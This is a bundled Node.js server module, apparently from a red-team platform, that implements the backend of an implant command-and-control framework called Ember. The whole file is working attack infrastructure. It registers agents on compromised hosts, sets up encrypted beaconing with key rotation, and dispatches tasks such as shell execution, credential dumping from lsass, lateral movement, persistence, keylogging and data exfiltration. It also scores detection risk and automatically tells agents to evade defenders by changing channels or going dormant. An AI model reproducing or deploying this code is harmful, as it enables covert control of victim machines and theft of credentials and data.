import {
  createAlert
} from "./chunk-BJCD7WA4.js";
import {
  EMBER_CAPABILITY_CATALOG,
  EMBER_PROFILE_DESCRIPTIONS
} from "./chunk-7ZYR7SA4.js";
import {
  checkBurnIndicators,
  deterministicScoreActionRisk,
  scoreActionRisk
} from "./chunk-VXRRKPWY.js";
import "./chunk-4SXJ2GAM.js";
import "./chunk-5BWO4Y3K.js";
import {
  emitEmberAgentRegistered,
  emitEmberBeacon,
  emitEmberBurnResponse,
  emitEmberCredentialHarvested,
  emitEmberDataExfiltrated,
  emitEmberKeyRotation,
  emitEmberLateralMovement,
  emitEmberNetworkDiscovered,
  emitEmberOpsecScored,
  emitEmberPersistenceEstablished,
  emitEmberTaskComplete,
  emitOpsecActionScored,
  emitOpsecBurnDetected,
  init_ws_event_hub
} from "./chunk-YW5WVS53.js";
import "./chunk-TCEHBLTC.js";
import "./chunk-RUIEEOYK.js";
import {
  getDb,
  init_db
} from "./chunk-L5ZLWR7T.js";
import "./chunk-NRYVRXXR.js";
import {
  emberAgents,
  emberBeacons,
  emberTasks,
  init_schema
} from "./chunk-L4JENJ4Z.js";
import "./chunk-KFQGP6VL.js";

// server/lib/ember-beacon-routes.ts
init_db();
init_schema();
import crypto2 from "crypto";
import { eq, and, inArray } from "drizzle-orm";

// server/lib/ember-crypto.ts
import crypto from "crypto";
var AES_KEY_LENGTH = 32;
var GCM_IV_LENGTH = 12;
var GCM_TAG_LENGTH = 16;
var ECDH_CURVE = "prime256v1";
var HKDF_HASH = "sha384";
var HKDF_INFO = Buffer.from("ember-c2-session-v1");
var KEY_ROTATION_INTERVAL_MS = 36e5;
var KEY_GRACE_PERIOD_MS = 3e5;
var MAX_SEQUENCE_GAP = 1e3;
var agentCryptoStates = /* @__PURE__ */ new Map();
function generateECDHKeyPair() {
  const ecdh = crypto.createECDH(ECDH_CURVE);
  ecdh.generateKeys();
  return {
    publicKey: ecdh.getPublicKey("base64"),
    privateKey: ecdh.getPrivateKey("base64"),
    createdAt: Date.now()
  };
}
function deriveSessionKey(serverPrivateKey, agentPublicKey, salt) {
  const ecdh = crypto.createECDH(ECDH_CURVE);
  ecdh.setPrivateKey(Buffer.from(serverPrivateKey, "base64"));
  const sharedSecret = ecdh.computeSecret(Buffer.from(agentPublicKey, "base64"));
  const effectiveSalt = salt || crypto.randomBytes(32);
  const prk = crypto.createHmac(HKDF_HASH, effectiveSalt).update(sharedSecret).digest();
  const hmac = crypto.createHmac(HKDF_HASH, prk);
  hmac.update(Buffer.concat([HKDF_INFO, Buffer.from([1])]));
  const okm = hmac.digest();
  return okm.subarray(0, AES_KEY_LENGTH);
}
function generateKeyId() {
  return `ek-${crypto.randomBytes(8).toString("hex")}`;
}
function createSessionKey(key, rotationIntervalMs = KEY_ROTATION_INTERVAL_MS) {
  const now = Date.now();
  return {
    keyId: generateKeyId(),
    key,
    createdAt: now,
    expiresAt: now + rotationIntervalMs,
    sequenceCounter: 0,
    highestSeenSequence: -1,
    recentSequences: /* @__PURE__ */ new Set()
  };
}
function encryptMessage(plaintext, sessionKey, aad) {
  const iv = crypto.randomBytes(GCM_IV_LENGTH);
  const cipher = crypto.createCipheriv("aes-256-gcm", sessionKey.key, iv, {
    authTagLength: GCM_TAG_LENGTH
  });
  if (aad) {
    cipher.setAAD(aad);
  }
  const data = typeof plaintext === "string" ? Buffer.from(plaintext, "utf-8") : plaintext;
  const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
  const tag = cipher.getAuthTag();
  sessionKey.sequenceCounter++;
  return {
    kid: sessionKey.keyId,
    iv: iv.toString("base64"),
    ct: encrypted.toString("base64"),
    tag: tag.toString("base64"),
    seq: sessionKey.sequenceCounter,
    ts: Date.now()
  };
}
function decryptMessage(message, sessionKey, aad) {
  if (message.seq <= sessionKey.highestSeenSequence) {
    if (sessionKey.recentSequences.has(message.seq)) {
      throw new EmberCryptoError("REPLAY_DETECTED", `Duplicate sequence number: ${message.seq}`);
    }
    if (sessionKey.highestSeenSequence - message.seq > MAX_SEQUENCE_GAP) {
      throw new EmberCryptoError("SEQUENCE_TOO_OLD", `Sequence ${message.seq} is too far behind ${sessionKey.highestSeenSequence}`);
    }
  }
  const iv = Buffer.from(message.iv, "base64");
  const ciphertext = Buffer.from(message.ct, "base64");
  const tag = Buffer.from(message.tag, "base64");
  const decipher = crypto.createDecipheriv("aes-256-gcm", sessionKey.key, iv, {
    authTagLength: GCM_TAG_LENGTH
  });
  if (aad) {
    decipher.setAAD(aad);
  }
  decipher.setAuthTag(tag);
  let decrypted;
  try {
    decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
  } catch (err) {
    throw new EmberCryptoError("AUTH_FAILED", "Authentication tag verification failed \u2014 message tampered or wrong key");
  }
  sessionKey.recentSequences.add(message.seq);
  if (message.seq > sessionKey.highestSeenSequence) {
    sessionKey.highestSeenSequence = message.seq;
    const cutoff = sessionKey.highestSeenSequence - MAX_SEQUENCE_GAP;
    for (const seq of sessionKey.recentSequences) {
      if (seq < cutoff) sessionKey.recentSequences.delete(seq);
    }
  }
  return decrypted;
}
function performKeyExchange(agentId, agentPublicKey, rotationIntervalMs = KEY_ROTATION_INTERVAL_MS) {
  const serverKeyPair = generateECDHKeyPair();
  const sessionKeyBytes = deriveSessionKey(serverKeyPair.privateKey, agentPublicKey);
  const sessionKey = createSessionKey(sessionKeyBytes, rotationIntervalMs);
  const state = {
    agentId,
    currentKey: sessionKey,
    previousKey: null,
    serverKeyPair,
    rotationCount: 0,
    totalEncrypted: 0,
    totalDecrypted: 0,
    lastActivityAt: Date.now(),
    rotationIntervalMs
  };
  agentCryptoStates.set(agentId, state);
  return {
    serverPublicKey: serverKeyPair.publicKey,
    keyId: sessionKey.keyId,
    rotationIntervalMs,
    serverTimestamp: Date.now()
  };
}
function performKeyRotation(agentId, newAgentPublicKey) {
  const state = agentCryptoStates.get(agentId);
  if (!state) {
    throw new EmberCryptoError("NO_SESSION", `No crypto session for agent ${agentId}`);
  }
  const newServerKeyPair = generateECDHKeyPair();
  const newSessionKeyBytes = deriveSessionKey(newServerKeyPair.privateKey, newAgentPublicKey);
  const newSessionKey = createSessionKey(newSessionKeyBytes, state.rotationIntervalMs);
  state.previousKey = state.currentKey;
  state.previousKey.expiresAt = Date.now() + KEY_GRACE_PERIOD_MS;
  state.currentKey = newSessionKey;
  state.serverKeyPair = newServerKeyPair;
  state.rotationCount++;
  state.lastActivityAt = Date.now();
  return {
    newKeyId: newSessionKey.keyId,
    newServerPublicKey: newServerKeyPair.publicKey,
    gracePeriodMs: KEY_GRACE_PERIOD_MS
  };
}
function encryptForAgent(agentId, plaintext) {
  const state = agentCryptoStates.get(agentId);
  if (!state) {
    throw new EmberCryptoError("NO_SESSION", `No crypto session for agent ${agentId}`);
  }
  const aad = Buffer.from(agentId, "utf-8");
  const message = encryptMessage(plaintext, state.currentKey, aad);
  state.totalEncrypted++;
  state.lastActivityAt = Date.now();
  return message;
}
function decryptFromAgent(agentId, message) {
  const state = agentCryptoStates.get(agentId);
  if (!state) {
    throw new EmberCryptoError("NO_SESSION", `No crypto session for agent ${agentId}`);
  }
  const aad = Buffer.from(agentId, "utf-8");
  if (message.kid === state.currentKey.keyId) {
    const result = decryptMessage(message, state.currentKey, aad);
    state.totalDecrypted++;
    state.lastActivityAt = Date.now();
    return result;
  }
  if (state.previousKey && message.kid === state.previousKey.keyId) {
    if (Date.now() > state.previousKey.expiresAt) {
      throw new EmberCryptoError("KEY_EXPIRED", `Key ${message.kid} has expired past grace period`);
    }
    const result = decryptMessage(message, state.previousKey, aad);
    state.totalDecrypted++;
    state.lastActivityAt = Date.now();
    return result;
  }
  throw new EmberCryptoError("UNKNOWN_KEY", `Unknown key ID: ${message.kid}`);
}
function needsKeyRotation(agentId) {
  const state = agentCryptoStates.get(agentId);
  if (!state) return false;
  return Date.now() >= state.currentKey.expiresAt;
}
function getAgentCryptoState(agentId) {
  const state = agentCryptoStates.get(agentId);
  if (!state) return null;
  return {
    agentId: state.agentId,
    rotationCount: state.rotationCount,
    totalEncrypted: state.totalEncrypted,
    totalDecrypted: state.totalDecrypted,
    lastActivityAt: state.lastActivityAt,
    rotationIntervalMs: state.rotationIntervalMs,
    currentKeyId: state.currentKey.keyId,
    currentKeyCreatedAt: state.currentKey.createdAt,
    currentKeyExpiresAt: state.currentKey.expiresAt,
    currentKeySequence: state.currentKey.sequenceCounter,
    previousKeyId: state.previousKey?.keyId || null,
    previousKeyExpiresAt: state.previousKey?.expiresAt || null,
    hasActiveSession: true
  };
}
function destroyAgentSession(agentId) {
  const state = agentCryptoStates.get(agentId);
  if (!state) return false;
  state.currentKey.key.fill(0);
  if (state.previousKey) state.previousKey.key.fill(0);
  agentCryptoStates.delete(agentId);
  return true;
}
function isValidRegistrationToken(token) {
  return /^[a-f0-9]{64}$/.test(token);
}
function encryptJsonForAgent(agentId, payload) {
  return encryptForAgent(agentId, JSON.stringify(payload));
}
function decryptJsonFromAgent(agentId, message) {
  const plaintext = decryptFromAgent(agentId, message);
  return JSON.parse(plaintext.toString("utf-8"));
}
var EmberCryptoError = class extends Error {
  constructor(code, message) {
    super(message);
    this.name = "EmberCryptoError";
    this.code = code;
  }
};

// server/lib/ember-beacon-routes.ts
init_ws_event_hub();
var TASK_OPSEC_MAP = {
  shell_exec: "command_execution",
  file_ops: "file_access",
  cred_dump: "credential_harvest",
  lateral_move: "lateral_movement",
  persist: "persistence",
  screenshot: "data_collection",
  keylog: "data_collection",
  exfil: "data_exfil",
  recon: "port_scan",
  privesc: "privesc_attempt",
  inject: "command_execution",
  self_destruct: "c2_callback"
  // Low risk — cleanup
};
var BURN_RESPONSE_MAP = {
  low: "jitter_increase",
  medium: "channel_hop",
  high: "sleep_extend",
  critical: "go_dormant"
};
function registerEmberBeaconRoutes(app) {
  console.log("[Ember] Registering beacon HTTP routes...");
  app.post("/api/ember/register", async (req, res) => {
    try {
      const {
        agentPublicKey,
        registrationToken,
        hostname,
        platform,
        arch,
        pid,
        username,
        profile,
        engagementId,
        systemInfo
      } = req.body;
      if (!agentPublicKey || !registrationToken) {
        return res.status(400).json({ error: "Missing required fields" });
      }
      if (!isValidRegistrationToken(registrationToken)) {
        return res.status(403).json({ error: "Invalid token" });
      }
      const agentId = `ember-${crypto2.randomBytes(6).toString("hex")}`;
      const keyExchange = performKeyExchange(
        agentId,
        agentPublicKey,
        36e5
        // 1 hour key rotation
      );
      const db = await getDb();
      const now = Date.now();
      const PLATFORM_MAP = {
        linux: "linux_x64",
        "linux_x64": "linux_x64",
        "linux_arm64": "linux_arm64",
        windows: "windows_x64",
        "windows_x64": "windows_x64",
        "windows_x86": "windows_x86",
        macos: "macos_x64",
        darwin: "macos_x64",
        "macos_x64": "macos_x64",
        "macos_arm64": "macos_arm64"
      };
      const PROFILE_MAP = {
        shadow: "ghost",
        ghost: "ghost",
        scout: "scout",
        striker: "striker",
        sentinel: "sentinel",
        hydra: "hydra",
        recon: "scout",
        stealth: "ghost"
      };
      const resolvedPlatform = PLATFORM_MAP[(platform || "linux").toLowerCase()] || "linux_x64";
      const resolvedProfile = PROFILE_MAP[(profile || "ghost").toLowerCase()] || "ghost";
      await db.insert(emberAgents).values({
        agentId,
        name: `ember-${hostname || "unknown"}`,
        hostname: hostname || "unknown",
        platform: resolvedPlatform,
        architecture: arch || "x64",
        pid: pid || 0,
        username: username || "unknown",
        profile: resolvedProfile,
        state: "active",
        primaryChannel: "https",
        beaconInterval: 30,
        jitterPercent: 25,
        lastBeaconAt: now,
        missedBeacons: 0,
        registrationToken,
        engagementId: engagementId || null,
        configJson: JSON.stringify({ profile: resolvedProfile, keyId: keyExchange.keyId }),
        systemInfoJson: systemInfo ? JSON.stringify(systemInfo) : null,
        evasionScore: 50,
        trafficProfile: "chrome_browsing",
        createdAt: now,
        updatedAt: now
      });
      await db.insert(emberBeacons).values({
        agentId,
        sequence: 0,
        state: "active",
        channel: "https",
        systemInfoJson: systemInfo ? JSON.stringify(systemInfo) : null,
        receivedAt: now
      });
      emitEmberAgentRegistered({
        agentId,
        hostname: hostname || "unknown",
        platform: platform || "unknown",
        profile: profile || "shadow",
        engagementId: engagementId || void 0
      });
      createAlert({
        type: "suspicious_activity",
        severity: "info",
        title: `Ember Agent Registered: ${agentId}`,
        description: `New Ember agent registered from ${hostname || "unknown"} (${platform || "unknown"}). Profile: ${profile || "shadow"}.`,
        source: "ember-beacon-handler",
        recommendation: "Monitor agent activity and ensure it operates within engagement scope."
      });
      const opsecScore = deterministicScoreActionRisk("c2_callback", `Ember agent registration from ${hostname}`, 0);
      emitEmberOpsecScored({
        agentId,
        taskType: "registration",
        riskScore: opsecScore.riskScore,
        riskLevel: opsecScore.riskLevel,
        detectionProbability: opsecScore.detectionProbability,
        burnRisk: opsecScore.burnRisk,
        engagementId: engagementId || void 0
      });
      return res.json({
        agentId,
        ...keyExchange,
        capabilities: EMBER_PROFILE_DESCRIPTIONS[profile] ? Object.keys(EMBER_CAPABILITY_CATALOG).slice(0, 5) : []
      });
    } catch (err) {
      console.error("[Ember Register] Error:", err.message, err.stack);
      return res.status(500).json({ error: "Registration failed" });
    }
  });
  app.post("/api/ember/beacon", async (req, res) => {
    try {
      const { agentId, message } = req.body;
      if (!agentId || !message) {
        return res.status(400).json({ error: "Invalid beacon" });
      }
      let beaconData;
      try {
        beaconData = decryptJsonFromAgent(agentId, message);
      } catch (err) {
        if (err instanceof EmberCryptoError) {
          if (err.code === "REPLAY_DETECTED") {
            return res.status(409).json({ error: "Replay detected" });
          }
          if (err.code === "NO_SESSION") {
            return res.status(401).json({ error: "No session \u2014 re-register" });
          }
          if (err.code === "KEY_EXPIRED") {
            return res.status(401).json({ error: "Key expired \u2014 rotate" });
          }
        }
        return res.status(403).json({ error: "Decryption failed" });
      }
      const db = await getDb();
      const now = Date.now();
      await db.update(emberAgents).set({
        state: beaconData.state || "active",
        lastBeaconAt: now,
        missedBeacons: 0,
        pid: beaconData.pid || void 0,
        evasionScore: beaconData.evasionScore || void 0,
        updatedAt: now
      }).where(eq(emberAgents.agentId, agentId));
      let resultsReceived = 0;
      if (beaconData.taskResults && beaconData.taskResults.length > 0) {
        for (const result of beaconData.taskResults) {
          await db.update(emberTasks).set({
            status: result.status === "success" ? "completed" : "failed",
            resultJson: JSON.stringify({ output: result.output, artifacts: result.artifacts }),
            completedAt: now,
            updatedAt: now
          }).where(eq(emberTasks.taskId, result.taskId));
          resultsReceived++;
          const taskRows = await db.select().from(emberTasks).where(eq(emberTasks.taskId, result.taskId)).limit(1);
          if (taskRows.length > 0) {
            const task = taskRows[0];
            const opsecActionType = TASK_OPSEC_MAP[task.type] || "command_execution";
            try {
              const opsecScore = await scoreActionRisk(
                opsecActionType,
                `Ember agent ${agentId} executed ${task.type}: ${JSON.stringify(task.params) || ""}`,
                void 0,
                void 0,
                void 0
              );
              emitEmberOpsecScored({
                agentId,
                taskType: task.type,
                riskScore: opsecScore.riskScore,
                riskLevel: opsecScore.riskLevel,
                detectionProbability: opsecScore.detectionProbability,
                burnRisk: opsecScore.burnRisk,
                engagementId: task.engagementId || void 0
              });
              emitOpsecActionScored({
                action: `ember:${task.type}`,
                riskScore: opsecScore.riskScore,
                detectionTechnologies: opsecScore.detectedBy.map((d) => d.technology),
                mitigations: opsecScore.mitigations,
                engagementId: task.engagementId || void 0
              });
              emitEmberTaskComplete({
                agentId,
                taskId: result.taskId,
                taskType: task.type,
                status: result.status,
                engagementId: task.engagementId || void 0,
                opsecRiskScore: opsecScore.riskScore
              });
              if (result.status === "success") {
                const params = typeof task.params === "string" ? JSON.parse(task.params || "{}") : task.params || {};
                switch (task.type) {
                  case "lateral_move":
                    emitEmberLateralMovement({
                      agentId,
                      sourceHost: beaconData.hostname || "unknown",
                      targetHost: params.targetHost || params.target || "unknown",
                      targetIp: params.targetIp || params.ip || "unknown",
                      method: params.method || "unknown",
                      success: true,
                      newAgentId: params.newAgentId,
                      engagementId: task.engagementId || void 0
                    });
                    break;
                  case "cred_dump":
                    emitEmberCredentialHarvested({
                      agentId,
                      credentialType: params.credType || "ntlm_hash",
                      targetService: params.service || "lsass",
                      username: params.username || "unknown",
                      domain: params.domain,
                      privilegeLevel: params.privilegeLevel || "user",
                      engagementId: task.engagementId || void 0
                    });
                    break;
                  case "exfil":
                    emitEmberDataExfiltrated({
                      agentId,
                      dataType: params.dataType || "file",
                      sizeBytes: params.sizeBytes || 0,
                      destination: params.destination || "c2",
                      channel: params.channel || "https",
                      engagementId: task.engagementId || void 0
                    });
                    break;
                  case "persist":
                    emitEmberPersistenceEstablished({
                      agentId,
                      method: params.method || "unknown",
                      targetHost: beaconData.hostname || "unknown",
                      path: params.path,
                      survivesReboot: params.survivesReboot ?? true,
                      engagementId: task.engagementId || void 0
                    });
                    break;
                  case "recon":
                    if (result.output) {
                      try {
                        const reconData = JSON.parse(result.output);
                        if (reconData.discoveredHosts?.length > 0) {
                          emitEmberNetworkDiscovered({
                            agentId,
                            discoveredHosts: reconData.discoveredHosts,
                            networkRange: params.range || params.target || "unknown",
                            scanType: params.scanType || "port_scan",
                            engagementId: task.engagementId || void 0
                          });
                        }
                      } catch {
                      }
                    }
                    break;
                }
              }
              if (opsecScore.burnRisk) {
                createAlert({
                  type: "opsec_violation",
                  severity: "high",
                  title: `Ember OPSEC Burn Risk: ${agentId}`,
                  description: `Task ${task.type} on agent ${agentId} has high burn risk (score: ${opsecScore.riskScore}). Detection probability: ${opsecScore.detectionProbability}%.`,
                  source: "ember-opsec",
                  recommendation: opsecScore.mitigations.join("; ") || "Consider reducing agent activity or rotating infrastructure."
                });
                emitOpsecBurnDetected({
                  indicator: `ember_task_${task.type}`,
                  severity: opsecScore.riskScore >= 80 ? "critical" : "warning",
                  description: `Ember agent ${agentId} task ${task.type} scored ${opsecScore.riskScore}/100 risk`,
                  engagementId: task.engagementId || void 0
                });
              }
            } catch {
            }
          }
        }
      }
      const recentBeacons = await db.select().from(emberBeacons).where(eq(emberBeacons.agentId, agentId)).limit(20);
      const burnEvents = recentBeacons.map((b) => ({
        type: "c2_callback",
        success: true,
        timestamp: Number(b.receivedAt)
      }));
      const burnIndicators = checkBurnIndicators(burnEvents);
      let burnResponse = null;
      if (burnIndicators.length > 0) {
        const worstSeverity = burnIndicators.reduce((worst, bi) => {
          const severityOrder = { critical: 4, high: 3, medium: 2, low: 1 };
          return severityOrder[bi.severity] > severityOrder[worst] ? bi.severity : worst;
        }, "low");
        const responseAction = BURN_RESPONSE_MAP[worstSeverity] || "jitter_increase";
        burnResponse = {
          action: responseAction,
          instructions: burnIndicators[0].recommendedAction
        };
        emitEmberBurnResponse({
          agentId,
          burnIndicator: burnIndicators[0].id,
          severity: worstSeverity === "low" ? "medium" : worstSeverity,
          action: responseAction,
          engagementId: void 0
        });
        createAlert({
          type: "opsec_violation",
          severity: worstSeverity === "low" ? "medium" : worstSeverity,
          title: `Ember Burn Detected: ${burnIndicators[0].name}`,
          description: `Agent ${agentId}: ${burnIndicators[0].description}. Automatic response: ${responseAction}.`,
          source: "ember-burn-detector",
          recommendation: burnIndicators[0].recommendedAction
        });
      }
      const pendingTasks = await db.select().from(emberTasks).where(and(
        eq(emberTasks.agentId, agentId),
        eq(emberTasks.status, "pending")
      )).limit(10);
      if (pendingTasks.length > 0) {
        const taskIds = pendingTasks.map((t) => t.taskId);
        await db.update(emberTasks).set({ status: "sent", sentAt: now }).where(inArray(emberTasks.taskId, taskIds));
      }
      const agentForSeq = await db.select().from(emberAgents).where(eq(emberAgents.agentId, agentId)).limit(1);
      const seqNum = (agentForSeq[0]?.beaconCount || 0) + 1;
      await db.update(emberAgents).set({ beaconCount: seqNum }).where(eq(emberAgents.agentId, agentId));
      await db.insert(emberBeacons).values({
        agentId,
        sequence: seqNum,
        state: beaconData.state || "active",
        channel: beaconData.channel || "https",
        healthJson: JSON.stringify({
          encrypted: true,
          payloadSize: JSON.stringify(message).length,
          tasksDelivered: pendingTasks.length,
          resultsReceived,
          processingTimeMs: Date.now() - now
        }),
        receivedAt: now
      });
      emitEmberBeacon({
        agentId,
        hostname: beaconData.hostname || "unknown",
        state: beaconData.state || "active",
        channel: beaconData.channel || "https",
        tasksDelivered: pendingTasks.length,
        resultsReceived
      });
      const rotationNeeded = needsKeyRotation(agentId);
      const responsePayload = {
        tasks: pendingTasks.map((t) => ({
          taskId: t.taskId,
          type: t.type,
          command: typeof t.params === "string" ? JSON.parse(t.params) : t.params || {},
          priority: t.priority,
          timeoutSeconds: t.timeoutSeconds || 300
        })),
        rotationNeeded,
        burnResponse,
        serverTimestamp: Date.now()
      };
      const encryptedResponse = encryptJsonForAgent(agentId, responsePayload);
      return res.json({ message: encryptedResponse });
    } catch (err) {
      console.error("[Ember Beacon] Error:", err.message);
      return res.status(500).json({ error: "Beacon processing failed" });
    }
  });
  app.post("/api/ember/result", async (req, res) => {
    try {
      const { agentId, message } = req.body;
      if (!agentId || !message) {
        return res.status(400).json({ error: "Invalid result" });
      }
      let resultData;
      try {
        resultData = decryptJsonFromAgent(agentId, message);
      } catch (err) {
        if (err instanceof EmberCryptoError) {
          if (err.code === "NO_SESSION") {
            return res.status(401).json({ error: "No session" });
          }
        }
        return res.status(403).json({ error: "Decryption failed" });
      }
      const db = await getDb();
      const now = Date.now();
      await db.update(emberTasks).set({
        status: resultData.status === "success" ? "completed" : "failed",
        resultJson: JSON.stringify({
          output: resultData.output,
          artifacts: resultData.artifacts,
          opsecNotes: resultData.opsecNotes
        }),
        completedAt: now,
        updatedAt: now
      }).where(eq(emberTasks.taskId, resultData.taskId));
      const taskRows = await db.select().from(emberTasks).where(eq(emberTasks.taskId, resultData.taskId)).limit(1);
      if (taskRows.length > 0) {
        const task = taskRows[0];
        const opsecActionType = TASK_OPSEC_MAP[task.type] || "command_execution";
        const opsecScore = deterministicScoreActionRisk(opsecActionType, `Ember ${task.type} result`, 0);
        emitEmberTaskComplete({
          agentId,
          taskId: resultData.taskId,
          taskType: task.type,
          status: resultData.status,
          engagementId: task.engagementId || void 0,
          opsecRiskScore: opsecScore.riskScore
        });
      }
      const ack = encryptJsonForAgent(agentId, { received: true, taskId: resultData.taskId });
      return res.json({ message: ack });
    } catch (err) {
      console.error("[Ember Result] Error:", err.message);
      return res.status(500).json({ error: "Result processing failed" });
    }
  });
  app.post("/api/ember/rotate", async (req, res) => {
    try {
      const { agentId, message } = req.body;
      if (!agentId || !message) {
        return res.status(400).json({ error: "Invalid rotation request" });
      }
      let rotationData;
      try {
        rotationData = decryptJsonFromAgent(agentId, message);
      } catch (err) {
        if (err instanceof EmberCryptoError) {
          if (err.code === "NO_SESSION") {
            return res.status(401).json({ error: "No session" });
          }
        }
        return res.status(403).json({ error: "Decryption failed" });
      }
      const oldState = getAgentCryptoState(agentId);
      const oldKeyId = oldState?.currentKeyId || "unknown";
      const rotationResponse = performKeyRotation(
        agentId,
        rotationData.newAgentPublicKey
      );
      emitEmberKeyRotation({
        agentId,
        oldKeyId,
        newKeyId: rotationResponse.newKeyId,
        rotationCount: oldState?.rotationCount ? oldState.rotationCount + 1 : 1
      });
      const encryptedResponse = encryptJsonForAgent(agentId, rotationResponse);
      return res.json({ message: encryptedResponse });
    } catch (err) {
      console.error("[Ember Rotate] Error:", err.message);
      return res.status(500).json({ error: "Rotation failed" });
    }
  });
  app.get("/api/ember/health", (_req, res) => {
    res.json({
      status: "ok",
      version: "1.0.0",
      timestamp: Date.now()
    });
  });
  app.post("/api/ember/heartbeat", async (req, res) => {
    try {
      const { agentId, registrationToken, state, pid, hostname, systemInfo } = req.body;
      if (!agentId || !registrationToken) {
        return res.status(400).json({ error: "Missing required fields" });
      }
      const db = await getDb();
      const now = Date.now();
      const agentRows = await db.select().from(emberAgents).where(eq(emberAgents.agentId, agentId)).limit(1);
      if (agentRows.length === 0) {
        return res.status(404).json({ error: "Agent not found" });
      }
      const agent = agentRows[0];
      if (agent.registrationToken !== registrationToken) {
        return res.status(403).json({ error: "Invalid token" });
      }
      const lastBeacon = Number(agent.lastBeaconAt) || 0;
      const beaconCount = (agent.beaconCount || 0) + 1;
      await db.update(emberAgents).set({
        state: state || "active",
        lastBeaconAt: now,
        missedBeacons: 0,
        beaconCount,
        pid: pid || agent.pid,
        updatedAt: now
      }).where(eq(emberAgents.agentId, agentId));
      await db.insert(emberBeacons).values({
        agentId,
        sequence: beaconCount,
        state: state || "active",
        channel: "https_heartbeat",
        systemInfoJson: systemInfo ? JSON.stringify(systemInfo) : null,
        receivedAt: now
      });
      const pendingTasks = await db.select().from(emberTasks).where(and(
        eq(emberTasks.agentId, agentId),
        eq(emberTasks.status, "pending")
      )).limit(10);
      if (pendingTasks.length > 0) {
        const taskIds = pendingTasks.map((t) => t.taskId);
        await db.update(emberTasks).set({ status: "sent", sentAt: now }).where(inArray(emberTasks.taskId, taskIds));
      }
      emitEmberBeacon({
        agentId,
        hostname: hostname || agent.hostname || "unknown",
        state: state || "active",
        channel: "https_heartbeat",
        tasksDelivered: pendingTasks.length,
        resultsReceived: 0
      });
      console.log(`[Ember Heartbeat] Agent ${agentId} beacon #${beaconCount} from ${req.ip}`);
      return res.json({
        status: "ok",
        beaconCount,
        tasks: pendingTasks.map((t) => ({
          taskId: t.taskId,
          type: t.type,
          command: typeof t.params === "string" ? JSON.parse(t.params) : t.params || {},
          priority: t.priority,
          timeoutSeconds: t.timeoutSeconds || 300
        })),
        nextBeaconMs: (agent.beaconInterval || 30) * 1e3,
        serverTimestamp: now
      });
    } catch (err) {
      console.error("[Ember Heartbeat] Error:", err.message, err.stack);
      return res.status(500).json({ error: "Heartbeat failed" });
    }
  });
  app.post("/api/ember/terminate", async (req, res) => {
    try {
      const { agentId, message } = req.body;
      if (!agentId) {
        return res.status(400).json({ error: "Missing agentId" });
      }
      if (message) {
        try {
          const termData = decryptJsonFromAgent(agentId, message);
          console.log(`[Ember] Agent ${agentId} terminating: ${JSON.stringify(termData)}`);
        } catch {
        }
      }
      const db = await getDb();
      const now = Date.now();
      await db.update(emberAgents).set({
        state: "terminated",
        terminatedAt: now,
        updatedAt: now
      }).where(eq(emberAgents.agentId, agentId));
      destroyAgentSession(agentId);
      createAlert({
        type: "suspicious_activity",
        severity: "info",
        title: `Ember Agent Terminated: ${agentId}`,
        description: `Agent ${agentId} has self-terminated and crypto session has been destroyed.`,
        source: "ember-beacon-handler",
        recommendation: "Verify termination was intentional. Check for signs of detection."
      });
      return res.json({ status: "terminated" });
    } catch (err) {
      console.error("[Ember Terminate] Error:", err.message);
      return res.status(500).json({ error: "Termination failed" });
    }
  });
  app.post("/api/ember/task-result", async (req, res) => {
    try {
      const { agentId, registrationToken, taskId, status, output, error: taskError, durationMs } = req.body;
      if (!agentId || !registrationToken || !taskId) {
        return res.status(400).json({ error: "Missing required fields" });
      }
      const db = await getDb();
      const now = Date.now();
      const [agent] = await db.select().from(emberAgents).where(eq(emberAgents.agentId, agentId)).limit(1);
      if (!agent || agent.registrationToken !== registrationToken) {
        return res.status(403).json({ error: "Invalid agent or token" });
      }
      const [task] = await db.select().from(emberTasks).where(and(
        eq(emberTasks.taskId, taskId),
        eq(emberTasks.agentId, agentId)
      )).limit(1);
      if (!task) {
        return res.status(404).json({ error: "Task not found" });
      }
      const finalStatus = status === "success" ? "success" : status === "failed" ? "failed" : "partial";
      await db.update(emberTasks).set({
        status: finalStatus,
        output: output ? String(output).slice(0, 65e3) : null,
        error: taskError ? String(taskError).slice(0, 2e3) : null,
        durationMs: durationMs || null,
        completedAt: now
      }).where(eq(emberTasks.taskId, taskId));
      emitEmberTaskComplete({
        agentId,
        taskId,
        taskType: task.type,
        status: finalStatus,
        engagementId: task.engagementId || void 0,
        opsecRiskScore: 0
      });
      console.log(`[Ember Task Result] Agent ${agentId} task ${taskId}: ${finalStatus}`);
      return res.json({ status: "ok", taskId, recorded: true });
    } catch (err) {
      console.error("[Ember Task Result] Error:", err.message, err.stack);
      return res.status(500).json({ error: "Failed to record task result" });
    }
  });
  console.log("[Ember] Beacon routes registered: /api/ember/{register,beacon,result,rotate,health,heartbeat,task-result,terminate}");
}
export {
  registerEmberBeaconRoutes
};
